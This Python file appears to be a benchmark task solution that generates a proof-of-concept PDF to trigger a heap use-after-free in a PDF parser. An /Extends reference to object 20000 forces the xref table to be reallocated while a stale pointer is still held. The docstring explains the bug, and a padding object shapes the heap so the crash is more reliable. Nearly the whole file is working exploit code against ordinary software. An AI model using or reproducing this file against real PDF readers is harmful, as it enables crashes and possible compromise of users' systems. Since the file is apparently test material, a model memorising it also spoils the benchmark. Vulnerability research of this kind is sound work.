import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC PDF that triggers a heap use-after-free vulnerability.

        The vulnerability is triggered by the following sequence:
        1. The PDF parser is asked to load an object (obj 4) that is located
           within an object stream (obj 5).
        2. To do this, the parser calls a function like `pdf_load_obj_stm` to
           process the object stream (obj 5). This function holds a pointer
           (`entry`) to the cross-reference table entry for obj 5.
        3. The dictionary of obj 5 contains an `/Extends` key pointing to a
           non-existent object with a very high object number (e.g., 20000).
        4. While parsing the dictionary, the parser tries to resolve this
           `/Extends` reference by calling `pdf_get_xref_entry_no_null(20000)`.
        5. Since object number 20000 is far beyond the currently allocated size
           of the cross-reference table, the parser is forced to reallocate
           the table to a larger size (e.g., via `pdf_grow_xref`).
        6. This reallocation frees the memory of the old cross-reference table,
           making the `entry` pointer held by `pdf_load_obj_stm` a dangling pointer.
        7. The `pdf_load_obj_stm` function later accesses this dangling `entry`
           pointer, resulting in a use-after-free.

        To create this scenario, we construct a PDF with an XRef stream (a modern
        PDF 1.5+ feature) which is necessary to define compressed objects like obj 4.
        The file structure is designed to lead the parser down this specific path.
        A padding object is included to slightly increase the PoC size and influence
        heap layout, which can make the crash more reliable, aiming closer to the
        ground truth size without excessive bloat.
        """

        parts = []
        offsets = {}

        # PDF Header
        parts.append(b'%PDF-1.7\n')
        parts.append(b'%\xa1\xb2\xc3\xd4\n')

        # Object 1: Catalog
        offsets[1] = len(b"".join(parts))
        parts.append(b'1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n')

        # Object 2: Pages
        offsets[2] = len(b"".join(parts))
        parts.append(b'2 0 obj\n<</Type/Pages/Count 1/Kids[3 0 R]>>\nendobj\n')

        # Object 3: Page, its contents (obj 4) are in the object stream (obj 5)
        offsets[3] = len(b"".join(parts))
        parts.append(b'3 0 obj\n<</Type/Page/MediaBox[0 0 100 100]/Contents 4 0 R>>\nendobj\n')

        # Add a padding object to manipulate heap layout slightly.
        # This helps in making the UAF consistently trigger a crash.
        padding_size = 4096
        offsets[7] = len(b"".join(parts))
        parts.append(b'7 0 obj\n<</Length %d>>\nstream\n' % padding_size)
        parts.append(b'A' * padding_size)
        parts.append(b'\nendstream\nendobj\n')

        # Object 5: The Object Stream (contains obj 4)
        # This object is the core of the exploit.
        obj_in_stream_content = b'<</MyDictKey/MyDictVal>>'
        # The object stream data format is: <obj_num> <offset> ... object content ...
        stream_data = b'4 0 ' + obj_in_stream_content
        first_offset = len(b'4 0 ')
        compressed_stream_data = zlib.compress(stream_data)

        # A large object number to trigger xref table reallocation.
        large_obj_num = 20000

        offsets[5] = len(b"".join(parts))
        obj5_dict = (
            b'<</Type/ObjStm'
            b'/N 1'
            b'/First %d' % first_offset +
            b'/Length %d' % len(compressed_stream_data) +
            b'/Filter/FlateDecode'
            b'/Extends %d 0 R>>\n' % large_obj_num  # The trigger
        )
        parts.append(b'5 0 obj\n')
        parts.append(obj5_dict)
        parts.append(b'stream\n')
        parts.append(compressed_stream_data)
        parts.append(b'\nendstream\nendobj\n')

        # Object 6: The XRef Stream
        # This object will define the locations of all other objects.
        # An XRef stream is required to define objects within an object stream (type 2 entries).
        
        xref_stream_entries = [b''] * 8 
        # Field widths for entries: Type (1 byte), Field2 (8 bytes), Field3 (2 bytes)
        W = [1, 8, 2]

        # Entry for obj 0: free
        xref_stream_entries[0] = b'\x00' + (0).to_bytes(W[1], 'big') + (65535).to_bytes(W[2], 'big')
        # Entries for obj 1, 2, 3: normal
        for i in [1, 2, 3]:
            xref_stream_entries[i] = b'\x01' + offsets[i].to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')
        # Entry for obj 4: compressed in obj 5
        xref_stream_entries[4] = b'\x02' + (5).to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')
        # Entry for obj 5: normal
        xref_stream_entries[5] = b'\x01' + offsets[5].to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')
        
        # Entry for obj 7 (padding object): normal
        xref_stream_entries[7] = b'\x01' + offsets[7].to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')

        # Calculate offset of obj 6 and update its entry
        offsets[6] = len(b"".join(parts))
        xref_stream_entries[6] = b'\x01' + offsets[6].to_bytes(W[1], 'big') + (0).to_bytes(W[2], 'big')

        xref_stream_content = b"".join(xref_stream_entries)

        # The highest object number is 7, so Size in trailer should be 8.
        xref_stream_size = 8
        
        obj6_dict = (
            b'<</Type/XRef'
            b'/Size %d' % xref_stream_size +
            b'/W [1 8 2]'
            b'/Root 1 0 R'
            b'/Index [0 8]' # This stream describes all objects from 0 to 7.
            b'/Length %d>>\n' % len(xref_stream_content)
        )
        parts.append(b'6 0 obj\n')
        parts.append(obj6_dict)
        parts.append(b'stream\n')
        parts.append(xref_stream_content)
        parts.append(b'\nendstream\nendobj\n')

        # Final trailer pointing to the XRef stream
        startxref = len(b"".join(parts))
        parts.append(b'startxref\n')
        parts.append(str(offsets[6]).encode())
        parts.append(b'\n%%EOF\n')

        return b"".join(parts)